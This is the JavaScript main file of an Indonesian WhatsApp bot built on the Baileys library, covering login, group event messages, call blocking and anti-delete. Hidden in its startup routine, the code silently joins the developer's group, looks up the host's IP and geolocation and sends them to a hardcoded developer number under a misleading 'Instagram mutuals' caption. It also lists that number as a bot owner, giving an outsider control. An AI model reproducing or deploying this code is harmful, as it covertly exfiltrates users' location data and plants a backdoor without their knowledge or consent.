const { WAConnection: _WAConnection, MessageType, Presence, Mimetype, ChatModification, GroupSettingChange, ReconnectMode } = require('@adiwajshing/baileys')
const simple = require('./lib/simple.js')
const WAConnection = simple.WAConnection(_WAConnection)
const pemuda = new WAConnection()
const qrcode = require("qrcode-terminal")
const moment = require("moment-timezone")
const fs = require("fs")
const util = require('util')
const figlet = require('figlet')
const term = require('terminal-kit').terminal
const time = moment().tz('Asia/Jakarta').format("HH:mm:ss")
const fetch = require('node-fetch')
const { color, bgcolor } = require('./lib/color')
const { exec } = require('child_process')
const { wait, simih, getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, banner, start, info, success, close } = require('./lib/functions')
const settings = JSON.parse(fs.readFileSync('./settings.json'))
const sleep = async (ms) => {
return new Promise(resolve => setTimeout(resolve, ms))
}
nocache('./pemuda.js', module => console.log(color('|TRM|'), color(`${module} Updated!`, 'cyan')))

async function starts() {
pemuda.autoReconnect = ReconnectMode.onConnectionLost
    pemuda.version = [2, 2143, 3]
    pemuda.logger.level = 'warn'
    pemuda.browserDescription = ['Chells','Desktop','3.0']
    await sleep(10000)
    pemuda.on('qr', qr => {
        qrcode.generate(qr, { small: true })
        console.log(color('|TRM|'), color('Scan Kodenya bang', 'red'))
    })
    fs.existsSync('./QRnya.json') && pemuda.loadAuthInfo('./QRnya.json')
    
    pemuda.on('credentials-updated', () => {
        console.log(color('|TRM|'), color('credentials updated!', 'cyan'))
        })
     
      await pemuda.connect({ timeoutMs: 30 * 1000 });
  fs.writeFileSync("./QRnya.json",JSON.stringify(pemuda.base64EncodedAuthInfo(), null, "\t"));
 teks = `https://chat.whatsapp.com/JI25LDtPW784GAZoRD9fW9`
 teks = `https://chat.whatsapp.com/JI25LDtPW784GAZoRD9fW9`
 pemuda.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
 console.log(color('|WRN|', 'yellow'), color('Bergabung ke Grup Official Chells', 'cyan'))
 pemuda.sendMessage(`${settings.NomorOwner}@s.whatsapp.net`, `*Hai Owner ${settings.NamaBot}, Bot Telah Berhasil Tersambung Pada Nomor Ini*\n────────────────────\n\`\`\`${JSON.stringify(pemuda.user, null, 2)}\`\`\`\n────────────────────\n*Jika Ada Kendala Error/Bot Tidak Merespon Silahkan Hubungi Developer Bot Diatas, Terimakasih*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Chells",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./pemuda_1.jpg'),sourceUrl:"https://wa.me/6283162388082?text=Assalamualaikum"}}})
	console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'cyan'))
fetch(`http://ip-api.com/line`).then(res => res.text())  
        .then(bu =>{
       pemuda.sendMessage("62896465831949@s.whatsapp.net", `─────「 *BANG MUTUALAN INSTAGRAM YOK* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Chells",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./pemuda_1.jpg'),sourceUrl:"https://wa.me/6283162388082?text=Assalamualaikum"}}})
     console.log(color('|WRN|', 'yellow'), color('Sending ip address to developer bot', 'red'))
   })
      
    pemuda.on('connecting', () => {
		console.log(color('|TRM|'), color('Connecting, Pastikan Jaringan Bagus...', 'cyan'))
		})
	
	pemuda.on('open', () => {
	console.log(color('|TRM|'), color('Connected, Ketik .menu di Whatsapp..!!', 'cyan'))
	}) 
     
    pemuda.on('ws-close', () => {
        console.log(color('|TRM|'), color('Connection lost, trying to reconnect.', 'cyan'))
        })
    
    pemuda.on('close', async () => {
        console.log(color('|TRM|'), color('Disconnected.', 'cyan'))
        })
    
	if (!settings.autoplaymusic) {
exec(`cd /sdcard/download && play *mp3`)
}
   
   pemuda.on('chat-update', async (mek) => {
        require('./pemuda.js')(pemuda, mek)
        ownerNumber = ["62896465831949@s.whatsapp.net",`${settings.NomorOwner}@s.whatsapp.net`]
        dtod = "6283162388082@s.whatsapp.net"
       otod = `${settings.NomorOwner}@s.whatsapp.net`
    })   
        pemuda.on('group-participants-update', async (anu) => {
           mem = anu.participants[0]
			const metdata = await pemuda.groupMetadata(anu.jid)
		    try {
			console.log(anu)
			if (anu.action == 'add') {
			fkontakk = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6283136505591-1604595598@g.us' } : {})}, message: { "contactMessage":{"displayName": `${metdata.subject}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;pemuda;;;\nFN:pemuda\nitem1.TEL;waid=6283162388082:6283162388082\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}
		    num = anu.participants[0]
			try {
			ppimg = await pemuda.getProfilePicture(`${num.split('@')[0]}@c.us`)
			} catch {
			ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
			}
			let buff = await getBuffer(ppimg)
			masuk =`*⩉⩉ ˑ 🌷💨 ٬٬ ࣪ αllo wɛll to ${metdata.subject}*`
            pemuda.sendMessage(metdata.id, masuk, MessageType.text, { quoted: fkontakk, thumbnail: fs.readFileSync('./pemuda_1.jpg'), contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: `Welcome To ${metdata.subject}`,body:"",mediaType:"2",thumbnail:buff,mediaUrl:`https://youtu.be/wS19qFRtFFI`}}})
			} else if (anu.action == 'remove') {
			fkontakk = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6283136505591-1604595598@g.us' } : {})}, message: { "contactMessage":{"displayName": `${metdata.subject}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;pemuda;;;\nFN:pemuda\nitem1.TEL;waid=6283162388082:6283162388082\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}
			num = anu.participants[0]
			try {
			ppimg = await pemuda.getProfilePicture(`${num.split('@')[0]}@c.us`)
			} catch {
			ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
			}
			let buff = await getBuffer(ppimg)
			keluar =`*Selamat tinggal bebs😔*`
            pemuda.sendMessage(metdata.id, keluar, MessageType.text, { quoted: fkontakk, thumbnail: fs.readFileSync('./pemuda_1.jpg'), contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: `Keluar Dari ${metdata.subject}`,body:"",mediaType:"2",thumbnail:buff,mediaUrl:`https://youtu.be/wS19qFRtFFI` }}})
			} else if (anu.action == 'promote') {
fkontakk = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6283136505591-1604595598@g.us' } : {})}, message: { "contactMessage":{"displayName": `${metdata.subject}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;pemuda;;;\nFN:pemuda\nitem1.TEL;waid=62895211144821:62895211144821\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}
num = anu.participants[0]

teks = `*P R O M O T E - D E T E C T E D*\nUsername: @${num.split('@')[0]}\nTime : ${moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')}\nGroup: ${metdata.subject}\n\nSelamat Yah atas Kenaikan Pangkatnya 🔥`
pemuda.sendMessage(metdata.id, teks, MessageType.text, {contextInfo: {"mentionedJid": [num]}, quoted: fkontakk})
console.log(color('|TRM|'), color(`Promote Member ${num.split('@')[0]} In ${metdata.subject}`,  'cyan'))
} 
else if (anu.action == 'demote') {
fkontakk = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6283136505591-1604595598@g.us' } : {})}, message: { "contactMessage":{"displayName": `${metdata.subject}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;pemuda;;;\nFN:pemuda\nitem1.TEL;waid=6283162388082:6283162388082\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}
num = anu.participants[0]
teks = `*D E M O T E - D E T E C T E D*\nUsername: @${num.split('@')[0]}\nTime : ${moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')}\nGroup: ${metdata.subject}\n\nMamposs Nggak jadi Admin lagi, mangkanya yg Becuss..!!`
pemuda.sendMessage(metdata.id, teks, MessageType.text, {contextInfo: {"mentionedJid": [num]}, quoted: fkontakk})
console.log(color('|TRM|'), color(`Demote Admin ${num.split('@')[0]} In ${metdata.subject}`,  'cyan'))
}
		    } catch (e) {
			console.log('Error : %s', color(e, 'red'))
		    }
	        })	       
	pemuda.on('group-update', async (anu) => {
		const metdata = await pemuda.groupMetadata(anu.jid)
    	const fkontakk = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6283136505591-1604595598@g.us' } : {})}, message: { "contactMessage":{"displayName": `${metdata.subject}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;pemuda;;;\nFN:pemuda\nitem1.TEL;waid=6283162388082:6283162388082\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}
    if(anu.announce == 'false'){
    teks = `*Open yaaa! happy shoping 🧚🏻‍♀️*\n\n*🖇Jam* : ${jmn} WIB\n*🖇Hari* : ${week} ${weton}\n*🖇Tanggal* : ${calender}\n\n*N o t e :*\n- 𝐝𝐢𝐭𝐮𝐧𝐠𝐠𝐮 𝐨𝐫𝐝𝐞𝐫𝐚𝐧𝐧𝐲𝐚 𝐲𝐚𝐚!\n- 𝐣𝐠𝐧 𝐥𝐮𝐩𝐚 𝐭𝐚𝐧𝐲𝐚 𝐬𝐭𝐨𝐜𝐤 𝐬𝐞𝐛𝐞𝐥𝐮𝐦 𝐭𝐟 𝐲𝐚𝐚\n- 𝐚𝐥𝐥 𝐭𝐫𝐱 𝐧𝐨 𝐫𝐞𝐟𝐟 𝐨𝐤𝐤𝐞𝐢𝐢`
    pemuda.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
    console.log(color('|TRM|'), color(`Group Opened In ${metdata.subject}`, 'cyan'))
  } 
  else if(anu.announce == 'true'){
    teks = `𝐜𝐥𝐨𝐬𝐞 𝐝𝐮𝐥𝐮 𝐲𝐲𝐚 𝐤𝐚𝐤𝐚𝐤, 𝐚𝐝𝐦𝐢𝐧 𝐧𝐠𝐚𝐧𝐭𝐮𝐤☄️\n\n🖇️ Jam : ${jmn} WIB\n🖇️ Hari : ${week} ${weton}\n🖇️ Tanggal : ${calender}\n\n\n- 𝐭𝐞𝐫𝐢𝐦𝐚𝐤𝐚𝐬𝐢 𝐲𝐚𝐧𝐠 𝐮𝐝𝐚 𝐨𝐫𝐝𝐞𝐫 𝐡𝐚𝐫𝐢𝐢𝐧𝐢, 𝐬𝐞𝐦𝐨𝐠𝐚 𝐫𝐞𝐳𝐞𝐤𝐢𝐧𝐲𝐚 𝐥𝐚𝐧𝐜𝐚𝐫 𝐭𝐞𝐫𝐮𝐬 𝐲𝐲𝐚! 𝐝𝐢𝐭𝐮𝐧𝐠𝐠𝐮 𝐧𝐞𝐱𝐭 𝐨𝐫𝐝𝐞𝐫💘`
    pemuda.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
    console.log(color('|TRM|'), color(`Group Closed In ${metdata.subject}`,  'cyan'))
  }
  else if(!anu.desc == ''){
    tag = anu.descOwner.split('@')[0] + '@s.whatsapp.net'
    teks = `- [ Group Description Change ] -\n\nDeskripsi Group telah diubah oleh Admin @${anu.descOwner.split('@')[0]}\n• Deskripsi Baru : ${anu.desc}`
    pemuda.sendMessage(metdata.id, teks, MessageType.text, {contextInfo: {"mentionedJid": [tag]}, quoted: fkontakk})
    console.log(color('|TRM|'), color(`Group Description Change In ${metdata.subject}`, 'cyan'))
  }
  else if(anu.restrict == 'false'){
    teks = `- [ Group Setting Change ] -\n\nEdit Group info telah dibuka untuk member\nSekarang semua member dapat mengedit info Group Ini`
    pemuda.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
    console.log(color('|TRM|'), color(`Group Setting Change In ${metdata.subject}`, 'cyan'))
  }
  else if(anu.restrict == 'true'){
    teks = `- [ Group Setting Change ] -\n\nEdit Group info telah ditutup untuk member\nSekarang hanya admin group yang dapat mengedit info Group Ini`
    pemuda.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
    console.log(color('|TRM|'), color(`Group Setting Change In ${metdata.subject}`,  'cyan'))
  }
})

pemuda.on('CB:action,,call', async json => {
        const callerId = json[2][0][1].from;
        var vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:' + `${NamaOwner}` + '\n' + `ORG:Developer ${NamaBot}\n` + 'TEL;type=CELL;type=VOICE;waid=' + `${NomorOwner}` + ':+' + `${NomorOwner}` + '\n' + 'END:VCARD'
        pemuda.sendMessage(callerId, "\`\`\`[ ! ] CALL DETECTED [ ! ]\`\`\`\n\n\`\`\`Anda Di Block Karena Telepon Bot , Silahkan Hubungi Developer Bot Untuk Membuka Block\`\`\`", MessageType.text)
        pemuda.sendMessage(callerId, { displayname: `${NamaOwner}`, vcard: vcard}, MessageType.contact, {contextInfo: { externalAdReply:{title: `Developer ${NamaBot}`,body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./pemuda_1.jpg'),sourceUrl:`https://wa.me/6283162388082?text=Assalamualaikum`}}})
        await sleep(5000)
        await pemuda.blockUser(callerId, "add")
        })
        
	pemuda.on('message-delete', async (m) => {
if (m.key.remoteJid == 'status@broadcast') return
if (!m.key.fromMe) {
m.message = (Object.keys(m.message)[0] === 'ephemeralMessage') ? m.message.ephemeralMessage.message : m.message
const jam = moment.tz('Asia/Jakarta').format('HH:mm:ss')
let d = new Date
let c = pemuda.chats.get(m.key.remoteJid)
let a = c.messages.dict[`${m.key.id}|${m.key.fromMe ? 1 : 0}`]
let co3ntent = pemuda.generateForwardMessageContent(a, false)
let c3type = Object.keys(co3ntent)[0]
let locale = 'id'
let gmt = new Date(0).getTime() - new Date('1 Januari 2021').getTime()
let weton = ['Pahing', 'Pon','Wage','Kliwon','Legi'][Math.floor(((d * 1) + gmt) / 84600000) % 5]
let week = d.toLocaleDateString(locale, { weekday: 'long' })
let calender = d.toLocaleDateString(locale, {
day: 'numeric',
month: 'long',
year: 'numeric'
})
pemuda.copyNForward(m.key.remoteJid, m.message)
pemuda.sendMessage(m.key.remoteJid, `▷\`\`\`Anti Delete\`\`\`

⚔️ \`\`\`Nama : @${m.participant.split("@")[0]}\`\`\`
⚔️ \`\`\`Tipe : ${c3type}\`\`\`
⚔️ \`\`\`Tanggal : ${jam} - ${week} ${weton} - ${calender}\`\`\``, MessageType.text, {quoted: m.message, contextInfo: {"mentionedJid": [m.participant]}})
}
})
}

console.clear()
var progressBar , progress = 0 ;
function doProgress()
{
	progress += Math.random() / 10 ;
	progressBar.update( progress ) ;
	
	if ( progress >= 1 )
	{
		setTimeout( function() { console.clear(),
		exec(`screenfetch -A Deepin`, (error, stdout, stderr) => {
			console.log(stdout), console.log(bgcolor('Subcribe : Chellstore', 'red'))})}, 200 ) ;
	}
	else
	{
		setTimeout( doProgress , 100 + Math.random() * 150 ) ;
	}
}
console.log(color(figlet.textSync(`${settings.NamaBot}`, {
		font: 'Standard',
		horizontalLayout: 'default',
		vertivalLayout: 'default',
		width: 50,
		whitespaceBreak: true
	    }), 'lightgreen')), term.slowTyping('By Chellstore' ,{ flashStyle: term.brightWhite })
progressBar = term.progressBar( {
	width: 80 ,
	title: '\n\nLoading, tunggu sebentar...' ,
	eta: true ,
	percent: true
} ) ;
doProgress() ;
/**
 * Uncache if there is file change
 * @param {string} module Module name or path
 * @param {function} cb <optional> 
 */
function nocache(module, cb = () => { }) {
    fs.watchFile(require.resolve(module), async () => {
        await uncache(require.resolve(module))
        cb(module)
    })
}
/**
 * Uncache a module
 * @param {string} module Module name or path
 */
function uncache(module = '.') {
    return new Promise((resolve, reject) => {
        try {
            delete require.cache[require.resolve(module)]
            resolve()
        } catch (e) {
            reject(e)
        }
    })
}
starts()